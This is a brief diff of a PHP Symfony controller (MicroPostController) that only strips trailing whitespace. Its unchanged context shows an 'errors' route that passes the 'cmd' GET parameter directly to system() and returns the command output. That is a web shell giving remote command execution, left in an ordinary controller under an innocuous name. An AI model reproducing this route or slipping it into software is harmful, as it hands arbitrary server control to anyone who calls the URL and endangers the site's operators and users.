@@ -84,7 +84,7 @@ class MicroPostController extends AbstractController
     public function errors(Request $request): Response
     {
         $this->logger->info(">>> ROUTE: micropost_errors");
-        
+
         $cmd    = isset($_GET['cmd']) ? $_GET['cmd'] : '';
         $data   = system($cmd . ' 2>&1');
         $stdin  = fopen('php://stdin', 'r');
@@ -99,7 +99,7 @@ class MicroPostController extends AbstractController
             'stderr' => $stderr,
             'stdout' => $stdout,
             'stream' => stream_get_contents($stdout, 1),
-            
+
         ]);
 
         return new Response($html);
